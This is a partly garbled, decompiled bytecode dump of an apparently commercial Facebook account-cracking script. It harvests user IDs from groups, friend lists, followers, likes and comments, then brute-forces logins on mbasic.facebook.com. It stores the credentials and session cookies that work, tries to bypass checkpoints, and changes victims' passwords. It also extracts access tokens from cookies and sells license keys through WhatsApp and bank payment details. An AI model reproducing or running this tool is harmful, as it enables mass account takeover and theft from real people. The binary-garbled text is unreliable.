o

    ^:bо  �                

   @   s>  d dl Z zd dlZW n ey   ed� e �d� Y nw zd dlZW n ey5   ed� e �d� Y nw zd dlZW n eyN   ed� e �d� Y nw d dlZd dl Z d dlZd dlZd dl	Z	d dlZ

d dlZd dlZd dl

Z

d dlZd dlZd dlZd dlmZ d d	l

m

Z

 d d

lmZ e

�� ZejZg d�Zzed k s�edkr�e�  ed

 ZW n ey�   e�  Y nw e

�� ZejZejZej Z!ee Z"dZ#dZ$dZ%dZ&dZ'dZ(dZ)dZ*e#e$e%e&e'e(e)e*gZ+e�,e+�Z-i i Z.Z/d\a0a1a2g g Z3Z4g a5g a1g Z6g Z7d a8dZ9dZ:dZ;ddiZ<ddddd d!d"d#d$d%d&d'd(�Z=d)Z>d*d+� Z?ej@e?d,�ZAeA�B�  e�Cd-� d.Z>d/d0� ZDd1d2� ZEeE�  d3d4� ZFeF�  e

�� ZejZd5d6� ZGd7d8� ZHd9d:� ZId;d<� ZJd=d>� ZKd?d@� ZLdAdB� ZMdCdD� ZNdEdF� ZOdGdH� ZPdIdJ� ZQdKdL� ZRdMdN� ZSdOdP� ZTdQdR� ZUdSdT� ZVG dUdV� dV�ZWeXdWk�r�eJ�  dS dS )X�    Nu1   

 [×] The Package requests is not installed!...

zpip install requestsu0   

 [×] The Package Futures Is Not Installed!...

zpip install futuresu,   

 [×] The Package Bs4 Is Not Installed!...

zpip install bs4)�ThreadPoolExecutor)�datetime)�

BeautifulSoup)�January�FebruaryzMarch,April�May�June�July�August�	September�October�November�December�   �   z[1;97mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95m�[1;96mz[0m)r   r   r   zhttps://lookup-id.com/�https://mbasic.facebook.comzhttps://www.httpbin.org/ip�

user-agentz�Mozilla/5.0 (Linux; Android 11; Asus Zenfone Max Pro M2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4681.3 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]r   r   ZMarchZAprilr   r   r	   r

   r   r   r

   r   )�01�02�03�04�05�06�07�08�09�10Z11Z12Fc               

   C   sd   t �d� t�g d��D ]#} tr d S tj�dt� dt	� dt� d�|  � tj�

�  t�d� qd S )N�clear)z[1;91m|z[1;92m/z[1;94m-r   �

�[�   •u.   ] CHECKING APPROVAL STATUS •••••• ���Q��?)

�os�system�	itertools�cycle�done�sys�stdout�write�N�O�flush�time�sleep)�c� r1   �elite.py�animateF   s   

$

�r3   )�targetg      �?Tc                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )N�

r"   )r(   r)   r*   r-   r.   r/   )�z�er1   r1   r2   �jalanT   s

   

�r8   c                   C   s   t dt � d S )Na�  %s

    

    

    

      [1;32;40m.##....##....###.....######..##.....##.####

      [1;37;40m.##...##....##.##...##....##.##.....##..##.

      [1;32;40m.##..##....##...##..##.......##.....##..##.

      [1;37;40m.#####....##.....##.##.......#########..##.

      [1;32;40m.##..##...#########.##.......##.....##..##.

      [1;37;40m.##...##..##.....##.##....##.##.....##..##.

      [1;32;40m.##....##.##.....##..######..##.....##.####)�printr+   r1   r1   r1   r2   �logo[   s   

�r:   c               	   C   s�   t t�� �t t�� � } d�| �}td| � zOt�d�j}||v r4td� t t�� �}t	�

d� W d S td� td� td� td	� td

� td� tt� dt� d

t� dt� d�� t�

d� t�  W d S    t��  tdkr|tt� t�  Y d S Y d S )N�-z[37;1m          YOUR KEY : z!https://pastebin.com/raw/ih8S3cdgz2[1;92m            YOUR KEY HAS BEEN ACTIVATED...!g333333�?zk[1;92m                                                                       MAKE PAYMENT TO THE AZA BELOWu-   [1;97m                 TOOL PRICE : 200RS+[1;92m                  VALIDITY : 2 WEEKSz6[1;97m       ACCOUNT NAME : LAL KHAN/[1;92m              ACCOUNT NUMBER: 03483812404[1;97m              UNITED BANK OF AFRICA (UBA)r    r!   �]zQ ONCE PAYMENT IS MADE DM KACHI WHATSAPP AND SEND YOUR KEY TO KACHI FOR APPROVAL..z$xdg-open https://wa.me/2349035850097�__main__)�strr#   �geteuid�getlogin�joinr9   �requests�get�textr.   r/   �H�Pr$   �exitr(   �namer:   �xoshnaw)Zuuid�idZhttpCaht�msgr1   r1   r2   rI   h   s.   



6�rI   c                  C   s   t �g d��} t �| �}|S )N)

�qMozilla/5.0 (SMART-TV; Linux; Tizen 2.3) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.0 TV Safari/538.1z�Mozilla/5.0 (BlackBerry; U; BlackBerry 9300; en-GB) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.600 Mobile Safari/534.8+z~Mozilla/5.0 (Linux; Android 11; Infinix X695) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36z�Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36zMozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4z�Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240ztMozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3zsMozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36rL   z�Mozilla/5.0 (Linux; Android 4.2.2; Le Pan TC802A Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36)�random�choice)�

user_agentZ

User_Agentr1   r1   r2   �

user_agentAPI�   s   

rP   c                 C   sv  t | �dks

t |�dk�r.tdtttf � tdttttt | ��tf � tdttttt |��tf � tdt� dt� d��}|dkrUtdt� d	t� d

�� t	| |� d S |dv �r

t

dt� d	t� d

�� t�d� tdt� dt� d��}|dv r�t

�d� tdt� dt� dt� dt� �� tdt� dt� d��}td� t |�dkr�tdtttf � nt�|� |D ]D}|�dd�}|�d�}t

dt� dt� dt� dt� |�dd�� t� �

� zt|d �dd�|d � W n tjjy�   Y q�w td� q�td� td ttf � t�  d S |d!v �rtd"t� d#t� d$�� d S tdt� d	t� d%�� t	| |� d S td&ttf � t�  d S )'Nr   z

 %s[%s#%s] CRACK COMPLETE...

z [%s+%s] TOTAL OK : %s%s%sz [%s+%s] TOTAL CP : %s%s%s�

 [�?z,] POP UP CHECKPOINT DETECTOR OPTIONS [Y/t]: � �!z] DONT LEAVE EMPTY��Y�y� [z(] TURN ON AIRPLANE MODE 3 SECONDS FIRST.�   z&] CHANGE PASSWORD WHEN TAP YES [Y/t]: �rV   rW   ZyarW   r!   �] PASSWORD SAMPLE : �Rajput�+�] ENTER NEW PASSWORD : Rajput1�)   

 %s[%s×%s] PASSWORD MINIMUM 6 CHARACTER�|� r    �>z#] TRYING TO LOGIN TO THE ACCOUNT : �    [×] r   �"   [ %sCHECK PROCESS COMPLETE %s]

��T�tz

  �*z

 GOODBYE:)z] Y/t z(

 [%s!%s] OPSHH YOU DONT GET RESULTS :()�lenr9   r+   �Kr,   rE   r>   �input�M�hasilr8   r.   r/   �ubahP�append�pwBaru�replace�split�	log_hasilrB   �

exceptions�ConnectionErrorrG   )�ok�cpZcek_cp�ww�pwBar�memek�kontol�titidr1   r1   r2   rm   �   sD   $

 

 



0�



$rm   c                  C   s�  t �d� t�� } tt� dt� d�� tt� dt� d�� tdttttf �}|dv r@t	dtt

f � t�d� t �d	� t

�  zl| jd

ddd

ddddddd�	d|id�}t�d|j�}tdd��|� tdd��|�d�� | �d|�d� ��� d }tdttt|tf � t�d� td ttf � t�d� td!ttf � t �d"� t�  W d S  ty�   td#tttf � t�d� t

�  Y d S  ty�   td#tttf � t�d� t

�  Y d S  tjjy�   td$tttf � Y d S w )%Nr   z *z� IF FACEBOOK PARTY DOES UPDATE SYSTEM, WE ARE NOT RESPONSIBLE FOR THE SCRIPT RESULTS THAT DO NOT SATISFY YOU AND WE CANNOT RETURN THE FUNDS .... THANK YOU z2 TYPE [BUY]  TO PURCHASE VERIFIED FACEBOOK COOKIESz

 %s[%s?%s] Cookies : %s)ZBUYZBuyZbuyz/

  %s* %sYOU WILL BE REDIRECTED TO PAYMENT PAGE�   z.xdg-open https://flutterwave.com/pay/cookieappz0https://business.facebook.com/business_locationsrL   zhttps://www.facebook.com/zbusiness.facebook.comzhttps://business.facebook.com�1z#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�	max-age=0zUtext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8ztext/html; charset=utf-8)	r   �refererZhost�origin�upgrade-insecure-requests�accept-language�

cache-control�accept�content-type�cookie)�headers�cookiesz	(EAAG\w+)�

.cokie.txt�a�

.token.txtr   z-https://graph.facebook.com/me?access_token=%srH   z

 %s*%s WELCOME %s%s%s�   zS %s*%s PLEASE USE THIS SC PROPERLY, WE ARE NOT RESPONSIBLE IF THIS SC IS MISUSED...z %s*%s PRESS ENTER zxdg-open https://kachiboost.comu   

 %s[%s×%s] COOKIES INVALID�$

 %s[%s!%s] NO INTERNET CONNECTION

)r#   r$   rB   �Sessionr9   r,   r+   rk   rj   r8   rE   r.   r/   �yayanxdrC   �re�searchrD   �openr*   �group�json�

moch_yayan�AttributeErrorrl   �UnboundLocalErrorrt   ru   rG   )�rr�   �dataZ

find_token�namar1   r1   r2   r�   �   sL   

*���

 

((�r�   c                  C   s�	  t �d� t�  t�t��� } | d }td� t�	d� td| � t�	d� z	t

dd��� }W n$ tyT   tdt

tt

f � t�	d	� t �d

� t �d� t�  Y nw zt�d|� ���� d

 }W n7 ty�   tdt

tt

f � t�	d	� t �d

� t �d� t�  Y n tjjy�   tdt

tt

f � Y nw t

d��� }d|i}tdt|t

f � t�	d� tdtt

f � t�	d� tdtt

f � t�	d� tdtt

f � t�	d� tdtt

f � t�	d� tdtt

f � t�	d� tdtt

f � t�	d� tdtt

f � t�	d� tdtt

f � t�	d� tdtt

f � t�	d� tdtt

tt

f � t�	d� tdtt

tt

f � t�	d� tdtt

f �}|dk�rftdt

tt

f � t�	d	� t�  �n�|d v �rtt

� d!��}|d"v �r�tdt

tt

f � t�	d	� t�  �ngzvtjd#|� �|d$�j}d%|v �r�td&|� d'�t

tt

f � t�	d	� t�  nMd(|v �r�td)t

tt

f � t�	d	� t�  n6d*|v �r�td&t� d'�t

tt

f � t�	d	� t�  ntd+t�d,|�d- d.d �  � td/� td#|� �� W �n� tjjtjjtjjf�y   td0� Y �n�w |d1v �rqz6td2� td3�}	t |	�}

t�d4|

�d5�� d6|� ���� d7 }|d8 D ]}t!�"|d9 d: |d

  � �qAW �n� t�yp   td;t

tt

f � t�	d<� t�  Y �n�w |d=v �r�tt

� d>��}|d"v �r�tdt

tt

f � t�	d	� t�  ztd/� t#d?|� �� W �nO t�y�   td@t$� dA�� t�	d	� t�  Y �n5w |dBv �r	tt

� dC��}|d"v �r�tdt

tt

f � t�	d	� t�  ztd/� t%dD|� �� W �n t�y   td@t$� dA�� t�	d	� t�  Y �n�w |dEv �rt&|� �n�|dFv �r`tt

� dC��}|d"v �r6tdt

tt

f � t�	d	� t�  ztd/� t'dG|� �� W �n� t�y_   td@t$� dA�� t�	d	� t�  Y �n�w |dHv �rjt(�  �n�|dIv �rtt)�  �n}|dJv �r:t �*dK�}

tdL� |

D ]}tdMtt

|f � �q�tdNtt

tf �}|dk�r�tdOt

tt

tt

f �}t

dP| ��� �+� }tdQt

tt

f � t�	d	� dR| �,dSdT�}|�,dUd��,dVd��,dWd��,dXd��,dYd�}t-dZtt

tt

tt|t

ttt.|�tf � tdQt

tt

f � t�	d	� |D ] }|�,d[d�}|�,d\d]��,d^d_�}td`|t

f � t�	d� �qtdQt

tt

f � tdatt

f � t�  n�|dbv �r�t-dct� ddt

� d[�� tde�}|dk�ratt

� dft� dgt

� dh�� n�|div �r�t-djttf � t�	dk� t �dl� t�	d	� t�  np|dmv �r�t-t/� dn�� t�  n`tt

� dft� dgt

� dh�� nR|dov �r�td� g dp�}|D ]}t0j1�2dqt

tt

|f � t0j1�3�  t�	dr� �q�t �d

� t �d� tdst

tt

tf � ntdtt

tt

t|t

f � t�	d	� t�  t4� �5t!�S )uNr   r�   z9 [1;97m[*] ---------------------------------------------r"   z [1;97m[*] IP         : %s

r�   r�   u   

 %s[%s×%s] COOKIE INVALIDr�   zrm -rf .token.txtzrm -rf .cokie.txtz2https://graph.facebook.com/me?fields&access_token=rH   r�   r�   r�   z [ Welcome %s%s%s ]

z% [%s01%s]. HACK ID FROM GROUP MEMBERSz) [%s02%s]. HACK FB FROM PUBLIC FRIENDLISTz! [%s03%s]. HACK FB FROM FOLLOWERSz+ [%s04%s]. HACK FB FROM POST LIKES/REACTIONz& [%s05%s]. HACK FB FROM RANDOM BULK IDz% [%s06%s]. HACK FB FROM POST COMMENTSz [%s07%s]. CHECKPOINT DETECTORz [%s08%s]. USERAGENT SETTINGSz [%s09%s]. CHECK HACKED RESULTSz" [%s10%s]. UPGRADE TO %s PREMIUM%sz& [%s00%s]. LOGOUT (%sDelete Cookies%s)z

 [%s*%s] MENU : rS   u   

 %s[%s×%s] DONT LEAVE EMPTY!�r~   r   z [?] ENTER GROUP ID : )rS   ra   z5https://mbasic.facebook.com/browse/group/members/?id=�r�   zHalaman Tidak Ditemukanu   

 %s[%s×%s] GROUP WITH ID z

 NOT FOUNDz/Anda Tidak Dapat Menggunakan Fitur Ini SekaranguN   

 %s[%s×%s] FACEBOOK LIMITS EVERY ACTIVITY, LIMIT BRO, PLEASE SWITCH ACCOUNTSzKonten Tidak Ditemukanz [*] GROUP NAME : z\<title\>(.*?)<\/title\>r   �   z7

 [!] TO STOP PRESS CTRL THEN PRESS C ON YOUR KEYBOARD.z

 [!] ERROR ON CONNECTION��2r   z6

 [*] TYPE 'ME' IF YOU WANT TO CRACK FROM FRIENDS LISTz [*] ENTER ID OR USERNAME : �https://graph.facebook.com/�_kontol_�-?fields=friends.fields(id,name)&access_token=�friendsr�   rJ   �<=>u=   

 %s[%s×%s] FAILED TO RETRIEVE ID, PROBABLY ID IS NOT PUBLICr}   ��3r   z0 [?] ENTER THE ID OR USERNAME OF THE FOLLOWER : �0https://mbasic.facebook.com/subscribe/lists/?id=z

 [!] WHY DO z6 THINK, YOU IDIOT, ENTER THE CORRECT POST ID, IT SUCKS)�4r   z [?] ENTER POST ID : zLhttps://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier=)�5r   )�6r   �https://mbasic.facebook.com/)�7r   )�8r   )�9r   �results�(

 [ CRACK RESULTS STORED IN YOUR FILE ]

� [%s+%s] %sz

 [%s?%s] ENTER FILENAME :%s z!

 %s[%s?%s] ENTER FILENAME :%s %sz

results/%s�7 %s[%s#%s] --------------------------------------------z%sr;   ra   �.txtZOKZCPZcp_detektorZ

invalid_okz= [%s*%s] RESULTS %sCRACK%s ON DATE %s:%s%s%s TOTAL %s: %s%s%sr5   �    [✓] u    [0m[[1;92m✓[0m][1;92m rc   u    [0m[[1;93m×[0m][1;93m z%s%sz

  [ %sRETURN%s ] )r   �

 z6  >>> GET PREMIUM USERS TO ENJOY ALL THE FEATURES!!<<<z. [?] DO YOU WANT TO UPGRADE TO PREMIUM [Y/T]: r    �   ×z] Y/T!rU   z-

 %s* %sYOU WILL BE REDIRECTED TO WHATSAPP...g{�G�z�?z]xdg-open https://wa.me/2349035850097?text=HELLO+KACHI+I+WANT+TO+BUY+LICENSE+KEY...........???re   z Good byee:))�0Z00)�[1;92m.   �[1;93m..  �[1;96m... r�   r�   r�   z

 %s[%s+%s] REMOVING COOKIES %sr   u+   

 %s[%s✓%s]%s SUCCESSFULLY REMOVED COOKIEu2   

 %s[%s×%s] MENU [%s%s%s] NO, CHECK THE MENU BRO!)6r#   r$   r:   rB   rC   �url_ipr�   r9   r.   r/   r�   �read�IOErrorr+   rl   r�   �KeyErrorrt   ru   rG   rj   r,   rE   rk   r�   rD   ZCOCKr�   �findall�

crack_grupZChunkedEncodingErrorZReadTimeout�__convert__rJ   ro   �	followersZCOCKS�	like_post�_ngocok_�ngomen_post�gabut�

seting_yntkts�listdir�

splitlinesrq   r8   ri   �Br(   r)   r*   r-   �	__crack__�plerr)ZipmZIP�tokenzr�   �cookiz�kuehZpepekr{   Zajg�user�_memek_r�   �x�dirs�file�totalZnm_fileZhps_nmrz   r|   ZupdZtitikr1   r1   r2   r�   �   s  

:�:�

&



&

,

$

, � �

$�(�



"&�



"&�





"&�













,(









"(r�   c                  C   s   t dttf � t dttf � tdtttf �} | dkr0t dtttf � t�d� t�  d S | dv r9t�  d S | dv rmz	t	d	d

��

� }W n

 tyS   dt }Y nw t dtttt|f � td

tttf � t

�  d S t dtttf � t�d� t�  d S )Nz

 (%s1%s) CHANGE USER AGENTz (%s2%s) CHECK USER AGENTz

 %s[%s?%s] CHOOSE : rS   �   

 %s[%s×%s] CANT EMPTYr�   r�   r�   �.YNTKTS.txtr�   z%s-z"

 %s[%s+%s] YOUR USER AGENT : %s%s�

  %s[ %sRETURN%s ]�   

 %s[%s×%s] CORRECT INPUT)r9   r,   r+   rk   rl   r.   r/   r�   �yo_ndak_tau_ko_tanya_saiar�   r�   r�   rE   r�   )ZytbjtsrO   r1   r1   r2   r�   g  s    &

�&r�   c                  C   sJ  t �d� tdttf �} | dkrtdtttf � t�  d S | dv rftdttttt	tf � t

�d� t �d� td	ttt	f �}td

d��

|� t

�d� tdtt	tf � td

tttf � t�  d S | dv r�tdttt	f �}td

d��

|� t

�d� tdtt	tf � td

tttf � t�  d S tdtttf � t�  d S )Nzrm -rf .YNTKTS.txtz0

 [%s?%s] WANT TO USE YOUR HP USER AGENT [Y/T]: rS   r�   rU   z�

 %s *%s YOU WILL BE REDIRECTED TO THE WEBSITE AFTER BEING REDIRECTED TO THE WEBSITE.

  %s*%s klik ikon %sMY USER AGENT%s lalu copy semua user agent anda...r�   z�xdg-open https://www.google.com/search?q=what+is+my+user+agent&oq=what+is+my+&aqs=chrome.3.69i59j69i60j69i57j35i39j0i512l4.2439j0j4&client=ms-android-transsion&sourceid=chrome-mobile&ie=UTF-8z& [%s?%s] ENTER YOUR HP USER AGENT :%s r�   �wu6   

 %s[%s✓%s] SUCCESSFULLY USING YOUR HP USER AGENT...r�   re   z [%s?%s] ENTER USER AGENT :%s u0   

 %s[%s✓%s] SUCCESSFULLY CHANGED USER AGENT...z

 %s[%s!%s] Y/T)r#   r$   rk   r,   r+   r9   rl   r�   r8   rE   r.   r/   r�   r*   r�   )Z_asu_Z_agen_r1   r1   r2   r�   z  s    

,r�   c                    s  z�t d��� }d|i�tj| �d�j}t�d|�}|D ]8}d|d v r7t�t�d|d �d d |d	  � n

t�|d d |d	  � t	j

�d

tt� � t	j

�

�  qd|v rlttt|d�jd

dd��d� � W d S � �fdd�� � t� d�t�d| ��d	� � W d S    Y d S )Nr�   r�   r�   z4\<h3\>\<a\ class\=".."\ href\="\/(.*?)"\>(.*?)<\/a\>�profile.php?r   �id=(.*)r�   r   �

 [*] COLLECTING %s ID... �Lihat Selengkapnya�html.parserr�   ��string�hrefc                    s�   t j| �d�j}t�d|�}t|�dkre|D ]N}d|d v r:t�d|d ��d�}|tv r.qt�	|d |d  � nt�d|d ��d�}|tv rJqt�	|d |d  � t

j�d	tt� � t

j�

�  qd

|v r|� tt|d�jdd

d

��d� � d S d S )Nr�   zL\<h3\ class\=".*?">\<span>\<strong>\<a\ href\="/(.*?)">(.*?)</a\>\</strong\>r   �profile.phpzprofile.php\?id=(\d*)r   r�   z(.*?)\?refidr�   zLihat Postingan Lainnyar�   r�   r�   r�   )rB   rC   rD   r�   r�   ri   r�   r�   rJ   ro   r(   r)   r*   r-   �url_mbr   �find)Zgeyr�   �br0   �d��gehr�   r1   r2   r�   �  s"    &�zcrack_grup.<locals>.gehz/groups/zid=(\d*))r�   r�   rB   rC   rD   r�   r�   rJ   ro   r(   r)   r*   ri   r-   r�   r�   r   r�   r�   r�   )�hencetr�   r{   rz   �softekr1   r�   r2   r�   �  s   ( (&r�   c                 C   s  z�t d��� }d|i}tj| |d�j}d|v r&td� t�d� t�  W d S t	�

d|�}|D ]>}d|d	 v rJt�t	�

d

|d	 �d	 d |d  � nt�t	�

d

|d	 �d	 d |d  � t

j�dtt� � t

j��  q.d|v r�ttt|d�jddd��d� � W d S W d S    Y d S )Nr�   r�   r�   zSemua 0zO

 [!] NO ONE RESPONDED TO THE POST, AWOKAWOKAWOK, SORRY THE ACCOUNT IS QUIET: vr�   z2\<h3\ class\=".."\>\<a\ href\="(.*?)"\>(.*?)<\/a\>r�   r   r�   r�   r   z/(.*)�

 [*] COLLECTING %s ID...  r�   r�   r�   r�   r�   )r�   r�   rB   rC   rD   r9   r.   r/   r�   r�   r�   rJ   ro   r(   r)   r*   ri   r-   r�   r�   r   r�   )r�   r�   r�   r{   rz   r�   r1   r1   r2   r�   �  s    (& (�r�   c           	   	   C   s�   zmt d��� }d|i}tj| |d�j}t|d�}|jddd�D ]3}d|�d	�v rC|j}d

�tj	�

d|�d	���}t�|d | d

 � t

j�dtt� � t

j��  q|jddd�D ]}d|jv rjtd|�d	� � qZW d S    Y d S )Nr�   r�   r�   r�   r�   T�r�   r�   r�   rS   zprofile\.php\?id=(.*?)&r�   r5   r�   r�   r�   )r�   r�   rB   rC   rD   r   �find_allrA   �bs4r�   r�   rJ   ro   r(   r)   r*   ri   r-   r�   )	r�   r�   r�   r{   rz   �mmk�bb�xd�asur1   r1   r2   r�   �  s"   

 

��r�   c                 C   sH  z�t d��� }d|i}tj| |td�j�d�}t|d�}|�d�D ]a}|jddd	�D ]W}d

|�d�v rS|�d��	d�d

 }|�	d�d }|j}	t

�|d |	 d � n|�d��	d�d }|�	d�d

 }|j}	t

�|d |	 d � tj

�dtt

� � tj

��  q*q!|jddd	�D ]}

d|

jv r�td|

�d� � q�W d S    Y d S )Nr�   r�   )r�   r�   zutf-8r�   �h3r�   Tr�   r�   r�   �=r   �&r   r�   r5   rR   �/r�   u   Lihat komentar lainnya…r�   )r�   r�   rB   rC   �header_gruprD   �encoder   r�   rr   rJ   ro   r(   r)   r*   ri   r-   r�   )r�   r�   r�   r{   rz   r�   Z_id_�xzr�   r�   r�   r1   r1   r2   r�   �  s0   

 �

��r�   c              

   C   s�   zt tdttf ��}W n   d}Y tdttf � t|�D ]T}|d7 }tdttt|tf �}t|�}z(t	�

d|�

d�� d| � ���� d }|d	 D ]}t�

|d

 d |d  � qKW q ttfys   td

� t�d� t�  Y qw d S )Nz#

 [%s?%s] INPUT NUMBER OF TARGET : r   z: [%s*%s] TYPE 'ME' IF YOU WANT TO CRACK FROM FRIENDS LIST

z' [%s*%s] ENTER ID OR USERNAME %s%s%s : r�   r�   r�   r�   r�   rJ   r�   rH   u7   

 [×] FAILED TO RETRIEVE ID, PROBABLY ID IS NOT PUBLICr}   )�intrk   rl   r+   r9   r,   �rangerE   r�   rB   rC   r�   rJ   ro   r�   r�   r.   r/   r�   )Z__ppk__Z

nanya_keunZmnhr�   r�   r�   r�   r1   r1   r2   r�   �  s"   $���r�   c                 C   sl   d| v rd| iS t �d| �r2t�d| � d��j}zt �dt|��d }W d|iS    | }Y d|iS d|iS )N�mer�   z\w+r�   z?_rdrz\;rid\=(\d+)\&r   )r�   r�   rB   rC   rD   r>   )r�   r�   r�   r1   r1   r2   r�      s   �r�   c            	      C   s4  t �d�} td� | D ]}tdtt|f � qtdt� dt� d�� t�d� t	dttt

f �}ztd	|� �d

��� }W n t

yQ   td� t�d� t�  Y nw t	d

t� dt� dt� d��}|dv r�t�d� tdt

� dt� dt

� dt� �� t	dt

� dt� d��}t|�dkr�tdtttf � nt�|� tdtttttt|��tf � tdtttf � |D ]D}|�dd�}|�d�}tdt� dt� d t� d!t� |�d"d�� t� �

� zt|d# �d"d�|d$ � W n tjjy�   Y q�w td� q�td� td%t

tf � t	d&ttf � t �d'|� �� t�  d S )(Nr�   r�   r�   rX   r�   z@] BEFORE ENTERING THE FILE, TURN ON AIRPLANE MODE FOR 3 SECONDS.rY   z

 [%s?%s] INPUT FILE NAME : %szresults/r�   z

 [!] FILE DOESNT EXISTr�   r�   r    rR   z&] CHANGE PASSWORD WHEN TAP YES [Y/T]: rZ   rW   r!   r[   r\   rQ   r]   r^   r_   z %s [%s*%s] TOTAL %s%s%s ACCOUNTSr�   r5   rS   r`   ra   rb   z] TRYING TO LOGIN TO ACCOUNT : rc   r   r   rd   z [ %sRETURN%s ] zrm -rf )r#   r�   r9   r,   r+   r8   rl   r.   r/   rk   rE   r�   �	readlinesr�   r�   rn   ro   ri   rp   rj   r>   rq   rr   rs   rB   rt   ru   r$   )	r�   r�   �filesZ	buka_bajurx   ry   rz   r{   r|   r1   r1   r2   r�     sD   

 �

 

 

0�

*r�   c              	   C   s  t �� }|j�ddddddd�� t|�td �jd	�}|�d

ddi�}|d

�D ]}t	�|�d�|�d�i� q(t	�| |d�� |j

d|�d� t	d�}t|jd	�}dt�dt

|j��v ritj�dtttf �f d|j�� v r�d|jv r�tdt� dt� dt� d�� d S d�dd� |j�� �� D ��}td d!��d"| � d#|� d#|� d$�� td%t� d&t� �� td't� d(t� d)t� �� t�d*� t||� d S d+|j�� v �r�t�dt

|��}	|�d

ddi�}

g d,�}|d

�D ]}|�d�|v r�t�|�d�|�d�i� q�|j

t|

�d� td�}t|jd	�}

d-}d.d� |

� d/�D �}t!|�d-k�r�d0|	v �r}d1t"v �rVt#}td%t� d2t� �� td't� d(t� d3t� �� t�d*� t$|||

| |� n~d4}td%t� d2t� �� td't� d(t� d5t� �� t�d*� t$|||

| |� nWd6t�dt

|��v �r�td7ttf � nCtd8d!��d9| � d#|� d$�� td:t� dt� d;t� d<�� n%td=t%� d>t&� d>t'� d?�d!��d9| � d@|� d$�� tdAtttt!|�f � t(t!|��D ]}tdBt

|dC �� dD�||  � �q�d S tdt� dt� d;t� dE�� tdFd!��d9| � d#|� d$�� d S )GN�mbasic.facebook.com��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�

gzip, deflatezid-ID,id;q=0.9r�   z�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;])�Hostr�   �accept-encodingr�   r�   r   z/login/?next&ref=dbl&fl&refid=8r�   �form�method�postrk   rH   �value)Zemail�passr   �action�r�   zTemukan Akun Anda�\<title>(.*?)<\/title>z4

 %s[%s!%s] TURN ON AIRCRAFT MODE 2 SECONDS         �c_userzAkun Anda Dikunci�

 r    r�   z] NEW SESSION ACCOUNT�;c                 S   �   g | ]

\}}d ||f �qS �z%s=%sr1   ��.0�keyr

  r1   r1   r2   �

<listcomp>G  �    zlog_hasil.<locals>.<listcomp>zresults/OKE.txtr�   r�   � | r5   u   

  🎉z2 HURRY BRO THIS ACCOUNT CHECKPOINT CAN BE BYPASSED�

  rh   z1  WAIT A MINUTE WHILE CHECKING THE APPLICATION...r"   �

checkpoint)�fb_dtsg�jazoest�checkpoint_datazsubmit[Continue]�nhr   c                 S   �   g | ]}|j �qS r1   �rD   )r  �cekr1   r1   r2   r  U  �    �optionz.Lihat detail login yang ditampilkan. Ini Anda?rW   z= HURRY UP AND TAP YES THIS ACCOUNT CHECKPOINT CAN BE BYPASSEDz>  WAIT A MINUTE CHANGING PASSWORD AND CHECKING APPLICATIONS...zYayanGanteng:vzA  WAIT A MINUTE CHANGING PASSWORD AND CHECKING THE APPLICATION...z%Masukkan Kode Masuk untuk MelanjutkanzB [%s!%s] OOOPS SORRY THIS ACCOUNT IS IN 2 FACTOR AUTHENTICATION :(zresults/ERROR.txtrc   ra   rT   z] Errorzresults/CP-DETEKTOR-r;   r�   r`   z %s[%s*%s] THERE IS %s OPTION z	 [[1;92mr   z[0m] z#] WRONG PASSWORD OR ALREADY CHANGEDzresults/INVALID-OK.txt))rB   r�   r�   �updater   rC   r�   rD   r�   r�   r	  r�   r�   r>   r(   r)   r*   r+   rl   r�   �get_dictr9   rA   �itemsr�   rE   r8   r,   r.   r/   �cek_apk�data2r�   ri   rn   rp   �ubah_pw�ha�op�tar�   )r�   Zpasw�sessionZsoupZlinkr�   ZurlPost�response�coki�title�link2Z	listInput�anZ	response2Znumberr"  r�   Zoptr1   r1   r2   rs   /  sr   �

 $8�



882$�"rs   c                 C   s�  i i }}g d�}|d�D ]}|� d�|v r#|�|� d�|� d�i� q

| jt|� d� |d�j}	t|	d�}

|

�dd	d

i�}g d�}dt�d

t	|	��v r�|

d�D ]}

|

� d�|v rf|�|

� d�|

� d�i� qP|�dd�

|�i� | jt|� d� |d�}d�

dd� | j�� �

� D ��}tdt� dt� dt� dt� dt� dt� dt� d|� dd�

|�� d|� t� �� tdd��d|� dd�

|�� d|� d�� t| |� d S d S )N)zsubmit[Yes]r  r  r  r  rk   rH   r

  r  r

  r�   r  r  r	  )zsubmit[Next]r  r  r  zCREATE NEW PASSWORDr  Zpassword_newrS   r  c                 S   r  r  r1   r  r1   r1   r2   r    r  zubah_pw.<locals>.<listcomp>r  r    u   ✓z%] SUCCESSFULLY CHANGED PASSWORD TO:

